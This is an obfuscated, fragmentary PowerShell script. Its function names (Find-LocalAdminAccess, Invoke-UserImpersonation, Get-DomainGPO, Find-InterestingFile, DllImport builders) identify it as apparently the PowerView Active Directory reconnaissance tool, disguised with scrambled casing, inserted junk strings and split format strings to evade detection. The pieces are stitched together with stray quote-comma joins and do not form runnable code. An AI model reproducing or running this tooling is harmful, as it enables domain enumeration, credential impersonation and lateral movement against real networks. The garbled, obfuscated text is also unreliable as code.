        [Parameter(VALuEfRompiPELiNeBYPRoperTynAME = YoV{tIJKRuE}, paRAmeTersEtNaME = Z3bdYNIJKAIJKMiCpIJKARAMIJKETERZ3b)]
        [switch]YoV{mIJKAnDatIJKoRY},

        [Parameter(valuEFROmpIPELiNEByprOpertyNaME = YoV{tRIJKUe}, PAraMetERSetNAMe = Z3bDynAmIJKICParIJKAMEIJKTErZ3b)]
        [int]YoV{pIJKOSItION},

        [Parameter(vaLueFRomPIPElIneBypropertynaME = YoV{tIJKRUe}, ParaMEteRseTnAME = Z3bDYnIJKAIJKMIJKIcParaMeTerZ3b)]
        [string]YoV{HE','Z3b-f S5zIndexS5z,S5zOfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        }
                    }
                    catch {
                        YoV{mIJKEMBIJKErDn} = YoV{NuIJKll}
                        YoV{MeIJKmbIJKERdOmaIJKIn} = YoV{NIJKUlL}
                    }

                    if (YoV{PROIJKpERTiIJKeS}.Z3bSAmaIJKccIJKounIJKTnaIJKMeZ3b) {
                        
                        YoV{MEIJKmbIJKerNaMe} = YoV{pIJKROPERTIJKIES}.Z3bsIJKAmaIJKCCIJKoIJKUNtnaMeZ3b[0]
                    }
                    else {
                        
                        try {
                            YoV{mEIJKMBIJKERnAIJKmE} = &(Z3b{0}{3}{4}{2}{1}Z3b-f S5zConvertS5z,S5zIDS5z,S5zom-SS5z,S5zFS5z,S5zrS5z) -ObjectSID YoV{PrOpeIJKRIJKTIEs}.Z3bcIJKNZ3b[0] @ADNameArguments
                        }
                        catch {
                            
                            ','5zriS5z) Z3bExcluding: YoV(YoV_.FullName) Z3b
                    YoV{COIJKNTiIJKNue} = YoV{FIJKAlse}
                }
                if (YoV{lAstAcCEIJKsIJKSTIJKIMe} -and (YoV{_}.Z3bLastIJKAIJKcCEIJKsIJKStiMeZ3b -lt YoV{LAIJKSTACIJKcIJKesIJKsTIMe})) {
                    YoV{cOIJKNTInIJKUE} = YoV{fIJKAIJKlse}
                }
                if (YoV{PsbIJKOUNDpIJKAIJKRaMIJKEtEIJKRs}[(Z3b{0}{4}{1}{2}{3}Z3b -fS5zLaS5z,S5zWritS5z,S5zeTimS5z,S5zeS5z,S5zstS5z)] -and (YoV{_}.Z3bLASTwIJKRiIJKTIJKETimeZ3b -lt YoV{laSTIJKWRIJKIIJKTEtIME})) {
                    YoV{CIJKONTIJKinuE} = YoV{FIJKAIJKLSE}
                }
                if (YoV{pSbIJKOIJKUNDpaRAmEtIJKeIJKRS}[(Z3b{1}{0}{2}Z3b -f S5zeS5z,S5zCrS5z,S5zationTimeS5z)] -and (YoV{_}.Z3bcreIJKAtIOntIIJKMeZ3b -lt YoV{cReAtioIJKNTIJKIME})) {
                    YoV{CoIJKNTIIJKNuE} = YoV{FIJKALSE}
                }
                if (YoV{psbOuNdPaIJKRIJKAmEIJKTERS}[(Z3b{3}{4}{0}{2}{1}Z3b -f S5zeS5z,S5zsS5z,S5zsS5z,S5zCheckWritS5z,S5zeAccS5z)] -and (-not (&(Z3b{1}{2}{0}Z3b-f S5zeS5z,S5zTeS5z,S5zst-WritS5z) -Path YoV{_}.Z3bfuLIJKlnIJKAMeZ3b))) {
                    YoV{cONIJKTiNue} = YoV{fIJKALSE}
                }
                if','IJKmpIJKUTErSEaRCHIJKERIJKArGumIJKeIJKNIJKTs}[(Z3b{2}{3}{1}{0}Z3b -fS5zmitS5z,S5zmeLiS5z,S5zSerS5z,S5zverTiS5z)] = YoV{SEIJKRverIJKTiMIJKeLIIJKmIJKiT} }
        if (YoV{PSIJKBOUnIJKdpaRAIJKMetERs}[(Z3b{2}{0}{1}Z3b -fS5zmbstoS5z,S5zneS5z,S5zToS5z)]) { YoV{coIJKMpUTEIJKRSeArCHeRIJKARguIJKMenTs}[(Z3b{3}{0}{2}{1}Z3b-f S5zbstS5z,S5zneS5z,S5zoS5z,S5zTomS5z)] = YoV{tOMBstIJKoIJKNE} }
        if (YoV{psIJKBIJKOUIJKNDIJKPARametIJKerS}[(Z3b{0}{2}{1}Z3b-fS5zCredS5z,S5ztialS5z,S5zenS5z)]) { YoV{cIJKOMpuTERIJKsEarcheIJKRAIJKRgIJKUME','dS5z,S5zishedname,name,samaccS5z,S5zameS5z,S5znS5z,S5z,objeS5z,S5zccouS5z,S5zntS5z)
            YoV{sEArIJKCHEIJKRargumIJKEIJKNTS}[(Z3b{2}{0}{1}Z3b-fS5zdS5z,S5zentityS5z,S5zIS5z)] = YoV{_}.Z3bManAGEIJKdIJKByZ3b
            YoV{nIJKULl} = YoV{sEIJKAIJKRcHIJKeRARIJKgUMeNtS}.(Z3b{0}{1}Z3b -f S5zReS5z,S5zmoveS5z).Invoke((Z3b{0}{2}{1}Z3b -f S5zLDAPFS5z,S5zlterS5z,S5ziS5z))

            
            
            YoV{GrOUPIJKmAnAIJKgER} = &(Z3b{3}{2}{0}{1}Z3b-fS5zDomainObjeS5z,S5zctS5z,S5z-S5z,S5zGetS5z) @SearcherArguments
            
            YoV{mIJKAnagEIJKdIJKgrouP} = &(Z3b{1}{2}{0}{3}Z3b-f S5zcS5z,S5zNew-ObjS5z,S5zeS5z,S5ztS5z) (Z3b{0}{2}{1}Z3b -fS5zPSObjeS5z,S5ztS5z,S5zcS5z)
            YoV{MaIJKNAIJKgEDIJKGroIJKUp} JGO &(Z3b{2}{1}{0}Z3b -f S5zrS5z,S5zeS5z,S5zAdd-MembS5z) (Z3b{2}{0}{3}{1}Z3b -fS5zotepropeS5z,S5zyS5z,S5zNS5z,S5zrtS5z) (Z3b{0}{1}Z3b-f S5zGrS5z,S5zou','lD},
                                           YoV{CalIJKliIJKNIJKGCoNIJKVEIJKNTiIJKONfiEld},
                                           YoV{chArSIJKEIJKTfiEIJKLd},
                                           YoV{eNTRYIJKpoIJKintFieLd}),
                [Object[]] @(YoV{sLIJKEIJKVaIJKLUE},
                             ([Runtime.InteropServices.CallingConvention] YoV{nIJKAtIJKiVecALIJKLINGCIJKONvEIJKNtiIJKON}),
                             ([Runtime.InteropServices.CharSet] YoV{ChIJKARseT}),
                             YoV{EXporTEDfIJKUIJKNCnIJKAme}))

            YoV{MEIJKTHOD}.(Z3b{0}{3}{2}{1}{4}Z3b-fS5zSS5z,S5ztomAttS5z,S5ztCusS5z,S5zeS5z,S5zributeS5z).Invoke(YoV{DLLIMPortATTrIJKIIJKBIJKUTE})
        }
    }

    END
    {
        if (YoV{mODUIJKLE} -is [Reflection.Assembly])
        {
            return YoV{tyPEIJKhaIJKSH}
        }

        YoV{returnIJKTyPIJKes} = @{}

        foreach (YoV{KIJKEy} in YoV{tyPIJKehAIJKsH}.Z3bkIJKeysZ3b)
        {
            YoV{TIJKYPe} = YoV{tYPIJKEIJKHash}[YoV{kIJKey}].(Z3b{0}{1}{2}Z3b -fS5zCreaS5z,S5zteTyS5z,S5zpeS5z).Invoke()

            YoV{rEIJKTuIJKRIJKNtYpes}[YoV{KIJKeY}] = YoV{tYIJKpe}
        }

        return YoV{REtUrIJKNIJKTYIJKPES}
    }
}


function pSEnIJKUM {


    [OutputType([Type])]
    Param (
        [Parameter(posItIoN = 0, MANdaToRy=YoV{tRIJKUe})]
        [ValidateScript({(YoV{_} -is [Reflection.Emit.ModuleBuilder]) -or (YoV{_} -is [Reflection.Assembly])})]
        YoV{MIJKoDuIJKLE},

        [Parameter(PoSitIOn = 1, maNDAtOry=YoV{tIJKRue})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{FIJKULlIJKNaMe},

        [Parameter(pOSiTIoN = 2, MandAtory=YoV{TIJKRuE})]
        [Type]
        YoV{tIJKypE},

        [Parameter(PosIt','
                                YoV{_} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdS5z,S5zmberS5z,S5zd-MeS5z) (Z3b{0}{1}{2}Z3b -f S5zNotepS5z,S5zropeS5z,S5zrtyS5z) (Z3b{1}{0}{2}Z3b -f S5ziS5z,S5zIsDomaS5z,S5znS5z) YoV{FIJKAIJKLSE}
                            }
                            else {
                                YoV{_} JGO &(Z3b{2}{1}{0}Z3b-fS5z-MemberS5z,S5zdS5z,S5zAdS5z) (Z3b{0}{3}{1}{2}Z3b -f S5zNoS5z,S5zropeS5z,S5zrtyS5z,S5ztepS5z) (Z3b{0}{1}{2}Z3b -fS5zIsS5z,S5zDomaS5z,S5zinS5z) YoV{TIJKRUE}
                            }
                        }
                    }
                    else {
                        YoV{mEMIJKBIJKers} JGO &(Z3b{3}{1}{2}{0}{4}Z3b -f S5zObjeS5z,S5zorS5z,S5zEach-S5z,S5zFS5z,S5zctS5','werVS5z,S5zedOnUseS5z,S5ziS5z,S5zRegLoggS5z))
                    YoV{rEIJKgLoGgedOIJKNUSIJKeR}
                }
            }
            catch {
                &(Z3b{0}{3}{2}{1}Z3b-f S5zWriS5z,S5zerboseS5z,S5ze-VS5z,S5ztS5z) (S5z[Get-ReS5z+S5zgLoggeS5z+S5zdS5z+S5zOn]S5z+S5z S5z+S5zEr','}{2}{4}{7}{1}{3}{6}{0}Z3b -f S5zonS5z,S5zersonS5z,S5znvokeS5z,S5zatS5z,S5z-UseS5z,S5zIS5z,S5ziS5z,S5zrImpS5z) -Credential YoV{cIJKReDIJKeNtIIJKAl}
            }
            else {
                YoV{lOIJKgoNIJKToKen} = &(Z3b{3}{0}{4}{1}{5}{2}Z3b -f S5zvoke-US5z,S5zerImpeS5z,S5zsonationS5z,S5zInS5z,S5zsS5z,S5zrS5z) -Credential YoV{cREIJKdENTiIJKAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (YoV{PsBoIJKUndPIJKArAIJKmIJKeteRs}[(Z3b{1}{0}Z3b-f S5zelayS5z,S5zDS5z)] -or YoV{pIJKSBoUndPArIJKAmETeIJKRS}[(Z3b{2}{0}{1}Z3b -fS5zopOnSuccesS5z,S5zsS5z,S5zStS5z)]) {

            &(Z3b{2}{0}{1}Z3b-f S5zVS5z,S5zerboseS5z,S5zWrite-S5z) Z3b[Find-LocalAdminAccess] Total number of hosts: YoV(YoVTargetComputers.count) Z3b
            &(Z3b{1}{0}{2}{3}Z3b -f S5zte-S5z,S5zWriS5z,S5zVS5z,S5zerboseS5z) (S5z[S5z+S5zFind-LS5z+S5zocalAdS5z+S5zminAcS5z+S5zcess] S5z+S5zDeS5z+S5zlay: S5z+Z3bYoVDelay, Z3b+S5zJiS5z+S5zttS5z+S5zer: S5z+Z3bYoVJitterZ3b)
            YoV{cOUIJKNTeR} = 0
            YoV{rAIJKNIJKdNo} = &(Z3b{1}{0}{2}{3}Z3b-f S5zbjS5z,S5zNew-OS5z,S5zeS5z,S5zctS5z) (Z3b{0}{1}{2}Z3b -f S5zSystem.S5z,S5zRS5z,S5zandomS5z)

            ForEach (YoV{taIJKRIJKGEtIJKComputeR} in YoV{TaRGEI','}{4}{3}{1}{2}{5}{0}Z3b-f S5zerS5z,S5zrS5z,S5zopeS5z,S5ziew.PS5z,S5zerVS5z,S5zrtyOutliS5z,S5zPowS5z})]
    [CmdletBinding(DeFAULTPArAMEtErSetnAmE = {Z3b{1}{0}{2}Z3b-fS5zaS5z,S5zClS5z,S5zssNameS5z})]
    Param(
        [Parameter(poSiTiON = 0, MAndatOrY = YoV{tIJKRUe}, pArAMeTERSeTNaMe = Z3bCLaSIJKsIJKNAmEZ3b)]
        [Alias({Z3b{1}{0}Z3b-f S5zssS5z,S5zClaS5z})]
        [ValidateSet({Z3b{1}{0}Z3b -f S5zserS5z,S5zUS5z}, {Z3b{0}{1}Z3b-f S5zGroS5z,S5zupS5z}, {Z3b{2}{0}{1}Z3b -fS5zteS5z,S5zrS5z,S5zCompuS5z})]
        [String]
        YoV{cIJKlIJKAsSIJKNAmE},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{RIJKeIJKFIJKerenIJKCIJKEpIJKROpeRtysEt},

        [Parameter(VAlUEfRoMpIPElINe = YoV{trIJKUe}, MaNdAToRy = YoV{tRIJKUE}, ParaMEtERsetname = Z3brEfEREIJKNCIJKeoIJKBJeIJKctZ3b)]
        [PSCustomObject]
        YoV{rEfERIJKEIJKNceOBIJKjeCt},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DoIJKmAIJKin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b -f S5zFilS5z,S5zterS5z})]
        [String]
        YoV{lDaPIJKFilTIJKeR},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b -f S5zthS5z,S5zDSPaS5z,S5zAS5z})]
        [String]
        YoV{SeaIJKRCHBAIJKsE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{1}{2}{0}{3}Z3b-f S5zllS5z,S5zomainCoS5z,S5zntroS5z,S5zerS5z,S5zDS5z})]
        [String]
        YoV{SeIJKRIJKVEr},

        [ValidateSet({Z3b{1}{0}Z3b -f S5zaseS5z,S5zBS5z}, {Z3b{0}{2}{1}Z3b-f S5zOneLS5z,S5zelS5z,S5zevS5z}, {Z3b{0}{2}{1}Z3b -fS5zSS5z,S5zbtreeS5z,S5zuS5z})]
        [String]
        YoV{sEArIJKcIJKhsCIJKOPe} = (Z3b{1}{0}Z3b-fS5zreeS5z,S5zSubtS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{resIJKULTpageIJKSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{serVeIJKRIJKTimIJKELiMit},

        [Switch]
        YoV{TIJKOmbSIJKToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKReDIJKENtial} =   (&(Z3b{1}{0}Z3b -f S5zCiS5z,S5zGS5z)  (Z3bvaRiAbLe:jZ3b+Z3bfZ3b+Z3bIZ3b)  ).Z3bvIJKALUeZ3b::Z3beMpIJKTYZ3b
    )

    BEGIN {
        YoV{USeIJKRrEfeIJKRIJKEnCeproPIJKEIJKRtYSIJKEt} = @((Z3b{0}{1}{3}{2}Z3b -fS5zadmincoS5z,S5zuS5z,S5ztS5z,S5znS5z),(Z3b{0}{3}{4}{1}{2}Z3b-fS5zaS5z,S5zreS5z,S5zsS5z,S5zccountexS5z,S5zpiS5z),(Z3b{1}{3}{0}{2}{4}Z3b-fS5zsswoS5z,S5zbaS5z,S5zrdS5z,S5zdpaS5z,S5ztimeS5z),(Z3b{1}{0}{3}{2}Z3b-f S5zouS5z,S5zbadpwdcS5z,S5ztS5z,S5znS5z),S5zcnS5z,(Z3b{1}{0}{2}Z3b -f S5zdS5z,S5zcoS5z,S5zepageS5z),(Z3b{2}{1}{0}{3}Z3b -fS5zrycoS5z,S5zuntS5z,S5zcoS5z,S5zdeS5z),(Z3b{2}{0}{3}{1}Z3b-f S5ztS5z,S5znS5z,S5zdescripS5z,S5zioS5z), (Z3b{0}{1}{3}{2}Z3b -fS5zdS5z,S5zisplaynaS5z,S5zeS5z,S5zmS5z),(Z3b{2}{3}{0}{4}{5}{1}Z3b -f S5zsS5z,S5zuishednameS5z,S5zdS5z,S5ziS5z,S5z','-[0S5z+S5z-9]S5z+S5z+-[0-9]+-[0-9]S5z+S5z+-[0-9]S5z+S5z+ZrwS5z)  -CrEPLAce ([cHar]90+[cHar]114+[cHar]119),[cHar]36)) }
','KNTIMe}) {
                        YoV{SEarcIJKHaIJKRIJKgS}[(Z3b{1}{2}{3}{0}Z3b -f S5zmeS5z,S5zCreatS5z,S5zionTS5z,S5ziS5z)] = YoV{CIJKREatIJKionTIIJKMe}
                    }
                    if (YoV{ChEckIJKWIJKRITeacIJKCeSS}) {
                        YoV{sIJKearCHarIJKGS}[(Z3b{0}{1}{3}{2}Z3b -fS5zChecS5z,S5zkS5z,S5ziteAccessS5z,S5zWrS5z)] = YoV{CHEcIJKKIJKWRiteIJKAcCEss}
                    }
                    &(Z3b{2}{5}{3}{1}{6}{0}{4}Z3b-f S5ziS5z,S5zInteresS5z,S5zFS5z,S5z-S5z,S5zngFileS5z,S5zindS5z,S5ztS5z) @SearchArgs
                }
            }

            if (YoV{tIJKOKENIJKHIJKAndlE})','JKUndpArAmeTIJKeRS}[(Z3b{3}{0}{2}{1}Z3b -f S5zdenS5z,S5zalS5z,S5ztiS5z,S5zCreS5z)]) { YoV{SEIJKAIJKRChIJKeraRGIJKUmEnTS}[(Z3b{3}{2}{0}{1}Z3b-f S5zntiaS5z,S5zlS5z,S5zredeS5z,S5zCS5z)] = YoV{CREIJKDEIJKNTiIJKAl} }

        YoV{CIJKOIJKNIJKVeRtIJKArgumeNts} = @{}
        if (YoV{PSbOIJKUnDIJKPaIJKRIJKAmetErs}[(Z3b{0}{1}Z3b-fS5zDoS5z,S5zmainS5z)]) { YoV{coIJKNIJKVerTaIJKRGIJKUMENTs}[(Z3b{1}{0}{2}Z3b -fS5zaiS5z,S5zDomS5z,S5znS5z)] = YoV{dIJKOmIJKAiN} }
        if (YoV{pSIJKBIJKOUIJKNDParAIJKmIJKEterS}[(Z3b{1}{0}Z3b -fS5zverS5z,S5zSerS5z)]) { YoV{ConvERIJKTIJKArIJKGIJKUIJKmENTS}[(Z3b{0}{1}Z3b-f S5zSerS5z,S5zverS5z)] = YoV{SeIJKRIJKVer} }
        if (YoV{pIJKsboUNDpIJKAIJKRametIJKeIJKRs}[(Z3b{2}{1}{0}Z3b -fS5zlS5z,S5zaS5z,S5zCredentiS5z)]) { YoV{COnveRIJKTAIJKRIJKGUmIJKENTs}[(Z3b{3}{0}{1}{2}Z3b-fS5zreS5z,S5zdentS5z,S5zialS5z,S5zCS5z)] = YoV{cReIJKdeIJKNtIal} }

        YoV{SIJKpLITOIJKPIJKTioN} =   YoV{ZIJKLU9}::Z3breIJKmOIJKVeeMIJKPtIJKYENtriIJKeSZ3b
    }

    PROCESS {
        if (YoV{psboUNIJKDpArIJKAIJKMIJKETerS}[(Z3b{1}{0}{2}Z3b-fS5zenS5z,S5zIdS5z,S5ztityS5z)]) { YoV{SIJKEarIJKcHERarIJKGUmeIJKNtS}[(Z3b{0}{1}{2}Z3b -f S5zIdeS5z,S5zntitS5z,S5zyS5z)] = YoV{IIJKDeNTIIJKTY} }

        &(Z3b{1}{0}{2}Z3b-f S5zDomaS5z,S5zGet-S5z,S5zinGPOS5z) @SearcherArguments JGO &(Z3b{2}{0}{3}{1}Z3b-fS5zrES5z,S5zh-ObjectS5z,S5zFoS5z,S5zacS5z) {
            YoV{GPIJKODISPlIJKAyIJKNIJKAme} = YoV{_}.Z3bdispIJKLaIJKYnAMeZ3b
            YoV{gpoNIJKAIJKme} = YoV{_}.Z3bnIJKAMeZ3b
            YoV{gpopIJKAtH} = YoV{_}.Z3bgIJKpCFIlEIJKSIJKyspaIJKTHZ3b

            YoV{paIJKRIJKsIJKEARgS} =  @{ (Z3b{1}{2}{0}Z3b-fS5ztTmplPathS5z,S5zGS5z,S5zpS5z) = (Z3bYoVGPOPath5rjMACHINE5rjMicrosoft5rjWindows Z3b+(S5zNT{0}SecEdit{S5z+S5z0}S5z+S5zGptTS5z+S5zmpl.S5z+S5ziS5z+S5znfS5z)  -f [cHar]92) }
            if (YoV{psBoIJKUIJKNdpaRIJKAMEtIJKErS}[(Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zCrS5z,S5zdentialS5z)]) { YoV{PARsEaIJKRIJKGs}[(Z3b{1}{0}{2}Z3b-fS5zredeS5z,S5zCS5z,S5zntialS5z)] = YoV{cReIJKdIJKenTIaL} }

            
            YoV{iIJKNF} = &(Z3b{1}{0}{3}{2}Z3b-fS5zGpS5z,S5zGet-S5z,S5zplS5z,S5ztTmS5z) @ParseArgs

            if (YoV{iIJKNf} -and (YoV{IIJKNf}.Z3bPIJKSBIJKASeZ3b.Z3bkeIJKYsZ3b -contains (Z3b{3}{2}{0}{1}Z3b -f S5zbershiS5z,S5zpS5z,S5zup MemS5z,S5zGroS5z))) {
                YoV{meIJKMBIJKERsIJKHIps} = @{}

                
                ForEach (YoV{MEIJKMIJKBEIJKRsHIP} in YoV{IIJKNf}.S5zGroup MembershipS5z.(Z3b{3}{2}{1}{0}Z3b-f S5zrS5z,S5zratoS5z,S5zumeS5z,S5zGetEnS5z).Invoke()) {
                    YoV{GIJKRouP}, YoV{RELIJKATiIJKON} = YoV{MEMBIJKErshIJKip}.Z3bkIJKeYZ3b.(Z3b{1}{0}Z3b-fS5zplitS5z,S5zSS5z).Invoke(S5z__S5z, YoV{sPIJKlIJKitoptIJKIoN}) JGO &(Z3b{1}{3}{2}{0}Z3b -fS5zctS5z,S5zFoS5z,S5zch-ObjeS5z,S5zrEaS5z) {YoV{_}.(Z3b{0}{1}Z3b -f S5zTriS5z,S5zmS5z).Invoke()}
                    
                    YoV{MeMbIJKerSIJKHIPvaLIJKUe} = YoV{mIJKEMBeIJKRSIJKhIp}.Z3bvIJKAluEZ3b JGO &(Z3b{1}{2}{0}{3}Z3b -f S5zere-S5z,S5zWS5z,S5zhS5z,S5zObjectS5z) {YoV{_}} JGO &(Z3b{2}{1}{0}Z3b-f S5ztS5z,S5zorEach-ObjecS5z,S5zFS5z) { YoV{_}.(Z3b{0}{1}Z3b-f S5zTS5z,S5zrimS5z).Invoke(S5z*S5z) } JGO &(Z3b{1}{0}{2}{3}Z3b -fS5ze-OS5z,S5zWherS5z,S5zbS5z,S5zjectS5z) {YoV{_}}

                    if (YoV{pSIJKBIJKoIJKUnDPARAMIJKEtErS}[(Z3b{4}{1}{5}{2}{3}{0}Z3b-fS5zersToSIDsS5z,S5zesolvS5z,S5zMS5z,S5zembS5z,S5zRS5z,S5zeS5z)]) {
                        
                        YoV{GIJKRIJKOIJKUpmeMbERS} = @()
                        ForEach (YoV{MemBIJKEr} in YoV{MembEIJKRShipIJKVALIJKUe}) {
                            if (YoV{mEMBIJKer} -and (YoV{mIJKEIJKMbEr}.(Z3b{1}{0}Z3b -fS5zmS5z,S5zTriS5z).Invoke() -ne S5zS5z)) {
                                if (YoV{meMIJKBER} -notmatch (Z3b{0}{2}{1}Z3b-fS5z^S-S5z,S5z-.*S5z,S5z1S5z)) {
                                    YoV{cOnvErtIJKTIJKOIJKARIJKGuMENTS} = @{(Z3b{0}{1}{2}Z3b -fS5zObjS5z,S5zectS5z,S5zNameS5z) = YoV{mEIJKmbIJKEr}}
                                    if (YoV{pIJKSbounIJKdpAIJKRAIJKMeIJKTErS}[(Z3b{1}{0}Z3b-fS5znS5z,S5zDomaiS5z)]) { YoV{coNVIJKerIJKTTIJKoaRGUmIJKeNts}[(Z3b{1}{0}Z3b -f S5zomainS5z,S5zDS5z)] = YoV{DoMIJKAiN} }
                                    YoV{MIJKEmbeRSIJKID} = &(Z3b{1}{2}{0}Z3b-fS5z-SIDS5z,S5zConS5z,S5zvertToS5z) @ConvertToArguments

              ','5z40.S5z,S5zerAcS5z,S5z(usS5z,S5z1.4.803S5z,S5zConS5z,S5z:S5z,S5z113556.S5z,S5z8)S5z,S5z=S5z,S5z.2.8S5z,S5z524S5z,S5ztrol:1S5z,S5zcounS5z,S5ztS5z,S5z28S5z)
            }
            if (YoV{pIJKsIJKBOUIJKNDpARamEtIJKeRS}[(Z3b{2}{1}{3}{0}Z3b -f S5zuthS5z,S5zToS5z,S5zTrustedS5z,S5zAS5z)]) {
                &(Z3b{1}{0}{2}Z3b -fS5zte-VS5z,S5zWriS5z,S5zerboseS5z) (Z3b{18}{17}{2}{11}{15}{16}{8}{0}{12}{25}{13}{20}{1}{10}{4}{9}{6}{21}{7}{3}{19}{23}{22}{14}{5}{24}Z3','dateScript({
            
            
            if(YoV{_}.(Z3b{1}{2}{0}Z3b-f S5zpeS5z,S5zGS5z,S5zetTyS5z).Invoke().Z3bNaIJKmEZ3b -notmatch (Z3b{3}{0}{2}{1}Z3b -fS5ztiS5z,S5zryS5z,S5zonaS5z,S5zDicS5z)) {
                Throw (Z3b{13}{15}{2}{0}{12}{8}{7}{4}{14}{19}{5}{17}{6}{16}{3}{9}{11}{10}{1}{18}Z3b -fS5zmeteS5z,S5zetersDictionary obS5z,S5zaraS5z,S5zSS5z,S5z a SyS5z,S5zmenS5z,S5zAutomatiS5z,S5zst beS5z,S5z muS5z,S5zBS5z,S5zaramS5z,S5zoundPS5z,S5zrsS5z,S5zBoundS5z,S5zstem.ManaS5z,S5zPS5z,S5zon.PS5z,S5zt.S5z,S5zjectS5z,S5zgeS5z)
            }
            YoV{tIJKRuE}
        })]
        YoV{bIJKOIJKUnDpARIJKAMeTIJKERS}
    )

    Begin {
        YoV{iNIJKTerIJKNALIJKdicTionARy} = &(Z3b{3}{2}{1}{0}Z3b-f S5ztS5z,S5zecS5z,S5z-ObjS5z,S5zNewS5z) -TypeName (Z3b{11}{7}{4}{14}{10}{9}{5}{1}{12}{3}{2}{6}{0}{8}{13}Z3b -fS5zterDS5z,S5z.RuS5z,S5zmeDS5z,S5ztiS5z,S5zm.MS5z,S5zionS5z,S5zefinedParameS5z,S5zsteS5z,S5ziS5z,S5zment.AutomatS5z,S5zgeS5z,S5zSyS5z,S5znS5z,S5zctionaryS5z,S5zanaS5z)
        function _teIJKMP { [CmdletBinding()] Param() }
        YoV{CIJKOMMOnPaIJKRAmEIJKTIJKeRs} = (&(Z3b{0}{2}{1}Z3b -fS5zGS5z,S5zndS5z,S5zet-CommaS5z) (Z3b{1}{','0}Z3b-fS5zMLS5z,S5zpsXS5z,S5zw.GrouS5z,S5zPowerVieS5z))
                    YoV{gIJKROuIJKpIJKsXMl}
                }
            }
        }
        catch {
            &(Z3b{3}{1}{4}{2}{0}Z3b -f S5zVerboseS5z,S5zrS5z,S5zte-S5z,S5zWS5z,S5ziS5z) (S5z[S5z+S5zGeS5z+S5zt-GroS5z+S5zupsXML] S5z+S5zErroS5z+S5zrS5z+S5z S5z+S5zpaS5z+S5zrsiS5z+S5zng S5z+Z3bYoVTargetGroupsXMLPath Z3b+S5z: S5z+Z3bYoV_Z3b)
        }
    }

    END {
        
        YoV{','{1}Z3b -f S5zGetTypS5z,S5zeS5z).Invoke(YoV{dlIJKLNAIJKME})
            }
        }
        else
        {
            
            if (!YoV{TyPIJKehIJKAsh}.(Z3b{3}{1}{0}{2}Z3b-f S5zinsS5z,S5ztaS5z,S5zKeyS5z,S5zConS5z).Invoke(YoV{dLlIJKNAME}))
            {
                if (YoV{NAIJKmEsPAIJKCE})
                {
                    YoV{TYpIJKeIJKHasH}[YoV{dIJKllIJKNAME}] = YoV{mIJKodUIJKle}.(Z3b{2}{0}{1}Z3b -f S5zinS5z,S5zeTypeS5z,S5zDefS5z).Invoke(Z3bYoVNamespace.YoVDllNameZ3b, (Z3b{0}{2}{4}{3}{1}Z3b -f S5zPuS5z,S5zInitS5z,S5zblic,BeforS5z,S5zeldS5z,S5zeFiS5z))
                }
                else
                {
                    YoV{tIJKyPEIJKHASh}[YoV{dLIJKlNaIJKme}] = YoV{mOdIJKUle}.(Z3b{0}{2}{1}Z3b -f S5zDS5z,S5zypeS5z,S5zefineTS5z).Invoke(YoV{dLIJKLnaIJKmE}, (Z3b{6}{4}{5}{1}{2}{3}{0}Z3b-fS5zitS5z,S5z,BefoS5z,S5zrS5z,S5zeFieldInS5z,S5zlS5z,S5zicS5z,S5zPubS5z))
                }
            }

            YoV{mIJKEtHIJKod} = YoV{tIJKypehaIJKSH}[YoV{dIJKllnaIJKME}].(Z3b{1}{3}{0}{2}Z3b -f S5zhoS5z,S5zDefinS5z,S5zdS5z,S5zeMetS5z).Invoke(
                YoV{fIJKUIJKNctIoNnaIJKME},
                (Z3b{0}{1}{4}{2}{3}Z3b -f S5zPublS5z,S5zic,StS5z,S5zokeImpS5z,S5zlS5z,S5zatic,PinvS5z),
                YoV{ReTURNtIJKyIJKpe},
                YoV{PArIJKAmeIJKTeRIJKTypeS})

            
            YoV{i} = 1
            foreach(YoV{PAIJKRameIJKTeR} in YoV{PaIJKRAMEtIJKEIJKRtYpeS})
            {
                if (YoV{pIJKAraMIJKETEr}.Z3bISbIJKYrEfZ3b)
                {
                    [void] YoV{MIJKEIJKTHOD}.(Z3b{1}{2}{0}{3}{4}Z3b -f S5zetS5z,S5zDefinePS5z,S5zaramS5z,S5zeS5z,S5zrS5z).Invoke(YoV{i}, S5zOutS5z, YoV{nuIJKLL})
                }

                YoV{I}++
            }

            YoV{dlliIJKMpIJKORt} = [Runtime.InteropServices.DllImportAttribute]
            YoV{SeTLAsIJKTERrIJKoIJKRFIJKielD} = YoV{DLIJKliIJKMpoIJKRt}.(Z3b{2}{0}{1}Z3b-f S5ztFieS5z,S5zldS5z,S5zGeS5z).Invoke((Z3b{1}{2}{0}Z3b -fS5zrorS5z,S5zSetLS5z,S5zastErS5z))
            YoV{CAlIJKlINGcoIJKNvIJKEnTIoIJKNIJKFIEIJKld} = YoV{dLlimIJKpIJKoRt}.(Z3b{2}{1}{0}Z3b-fS5zldS5z,S5zFieS5z,S5zGetS5z).Invoke((Z3b{2}{3}{0}{4}{1}Z3b-fS5znventiS5z,S5znS5z','RIJKArGuIJKMeNTS}[(Z3b{1}{2}{0}Z3b-fS5znS5z,S5zDS5z,S5zomaiS5z)] = YoV{DOIJKmIJKAiN} }
        if (YoV{PSbOIJKUNIJKdPIJKAIJKRIJKAmETers}[(Z3b{1}{2}{3}{0}Z3b-f S5ziesS5z,S5zPS5z,S5zroperS5z,S5ztS5z)]) { YoV{sEArcHIJKerARGIJKUIJKMENtS}[(Z3b{2}{1}{0}Z3b -f S5zesS5z,S5zopertiS5z,S5zPrS5z)] = YoV{PrIJKOPIJKerTiIJKes} }
